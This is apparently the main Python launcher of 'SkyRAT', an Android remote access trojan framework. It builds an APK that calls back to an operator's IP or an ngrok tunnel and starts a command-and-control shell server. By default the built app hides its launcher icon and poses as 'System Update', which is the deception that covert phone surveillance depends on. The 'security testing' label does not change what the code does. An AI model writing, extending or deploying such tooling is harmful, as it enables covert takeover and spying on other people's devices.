#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SkyRAT - Android Security Testing Tool
Main entry point for the SkyRAT framework

Author: Tech Sky - Security Research Team
Version: 2.0.0
License: MIT (for authorized security research only)
"""

import argparse
import sys
import os
from pathlib import Path

# Add utils to path
sys.path.append(str(Path(__file__).parent / "utils"))

from utils.server import get_shell, clear_screen
from utils.builder import SkyRATBuilder
from utils.network import setup_ngrok

def print_banner():
    """Print SkyRAT banner"""
    banner = """\033[1m\033[91m
 ____  _          ____      _  _____ 
/ ___|| | ___   _|  _ \    / \|_   _|
\___ \| |/ / | | | |_) |  / _ \ | |  
 ___) |   <| |_| |  _ <  / ___ \| |  
|____/|_|\_\\__, |_| \_\/_/   \_\_|  
            |___/                    

    Android Security Testing Framework
    \033[93mBy Tech Sky - Security Research Team\033[0m
    """
    print(banner)

def main():
    parser = argparse.ArgumentParser(
        description="SkyRAT - Android Security Testing Framework",
        usage="%(prog)s [--build] [--shell] [--ngrok] [-i IP] [-p PORT] [-o OUTPUT]"
    )
    
    # Main operation modes
    parser.add_argument('--build', action='store_true', 
                      help='Build the Android APK with specified configuration')
    parser.add_argument('--shell', action='store_true',
                      help='Start the command and control server')
    parser.add_argument('--ngrok', action='store_true',
                      help='Use ngrok for external tunnel (with --build)')
    
    # Configuration options
    parser.add_argument('-i', '--ip', metavar='<IP>', type=str,
                      help='Server IP address')
    parser.add_argument('-p', '--port', metavar='<PORT>', type=str, default='8000',
                      help='Server port (default: 8000)')
    parser.add_argument('-o', '--output', metavar='<APK_NAME>', type=str,
                      help='Output APK filename (default: skyrat.apk)')
    
    # APK configuration
    parser.add_argument('--visible-icon', action='store_true',
                      help='Make app icon visible in launcher (default: hidden)')
    parser.add_argument('--app-name', metavar='<NAME>', type=str, default='System Update',
                      help='App display name (default: System Update)')
    
    # Development options
    parser.add_argument('--debug', action='store_true',
                      help='Enable debug mode with verbose output')
    parser.add_argument('--clean', action='store_true',
                      help='Clean build directory before building')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not any([args.build, args.shell]):
        print_banner()
        parser.print_help()
        return
    
    if args.debug:
        import logging
        logging.basicConfig(level=logging.DEBUG)
    
    try:
        if args.build:
            handle_build_mode(args)
        elif args.shell:
            handle_shell_mode(args)
            
    except KeyboardInterrupt:
        print("\n\033[1m\033[33m[INFO]\033[0m Operation cancelled by user")
    except Exception as e:
        print(f"\033[1m\033[31m[ERROR]\033[0m {e}")
        if args.debug:
            import traceback
            traceback.print_exc()

def handle_build_mode(args):
    """Handle APK building"""
    print_banner()
    
    builder = SkyRATBuilder(debug=args.debug)
    
    # Clean if requested
    if args.clean:
        builder.clean_build_directory()
    
    # Setup ngrok if requested
    if args.ngrok:
        print("\033[1m\033[33m[INFO]\033[0m Setting up ngrok tunnel...")
        ip, port = setup_ngrok(args.port)
        print(f"\033[1m\033[32m[SUCCESS]\033[0m Ngrok tunnel: {ip}:{port}")
    else:
        if not args.ip:
            print("\033[1m\033[31m[ERROR]\033[0m IP address required (use -i)")
            return
        ip, port = args.ip, args.port
    
    # Configuration
    config = {
        'ip': ip,
        'port': port,
        'icon_visible': args.visible_icon,
        'app_name': args.app_name,
        'output': args.output or 'skyrat.apk'
    }
    
    print(f"\033[1m\033[33m[INFO]\033[0m Building SkyRAT APK...")
    print(f"  Server: {ip}:{port}")
    print(f"  Icon: {'Visible' if args.visible_icon else 'Hidden'}")
    print(f"  Output: {config['output']}")
    
    # Build APK
    success = builder.build_apk(config)
    
    if success:
        print(f"\033[1m\033[32m[SUCCESS]\033[0m APK built successfully!")
        print(f"  Location: {builder.get_output_path(config['output'])}")
        
        if args.ngrok:
            print(f"\033[1m\033[33m[INFO]\033[0m Starting C&C server...")
            get_shell("0.0.0.0", int(args.port))
    else:
        print("\033[1m\033[31m[ERROR]\033[0m APK build failed")

def handle_shell_mode(args):
    """Handle C&C server mode"""
    if not args.ip or not args.port:
        print("\033[1m\033[31m[ERROR]\033[0m IP and port required for shell mode")
        return
    
    print_banner()
    print(f"\033[1m\033[33m[INFO]\033[0m Starting SkyRAT C&C Server")
    print(f"  Listening on: {args.ip}:{args.port}")
    print(f"  Waiting for connections...")
    
    get_shell(args.ip, int(args.port))

if __name__ == "__main__":
    main()